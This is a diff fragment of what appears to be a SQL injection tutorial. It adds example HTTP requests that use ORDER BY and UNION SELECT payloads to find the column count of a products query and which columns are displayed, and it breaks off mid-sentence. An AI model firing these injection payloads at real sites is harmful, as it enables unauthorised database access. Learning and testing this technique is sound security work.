@@ -103,4 +103,22 @@ Let's walk through a complete example of exploiting a union-based SQL injection:
    Method 1 (ORDER BY):
    ```http
    GET /products?id=1 ORDER BY 1-- HTTP/1.1
-   GET /products?id=1 ORDER BY 2-- HTTP/1
+   GET /products?id=1 ORDER BY 2-- HTTP/1.1
+   ...
+   ```
+   When you exceed the number of columns (e.g., ORDER BY 5 fails), you've found the limit.
+
+   Method 2 (UNION SELECT):
+   ```http
+   GET /products?id=1 UNION SELECT NULL-- HTTP/1.1
+   GET /products?id=1 UNION SELECT NULL,NULL-- HTTP/1.1
+   ...
+   ```
+   Continue adding NULLs until no error occurs.
+
+3. **Find which columns are displayed**:
+   Replace NULLs with numbers or strings to see which appear in output:
+   ```http
+   GET /products?id=999 UNION SELECT 111,'aaa',222-- HTTP/1.1
+   ```
+   999 ensures
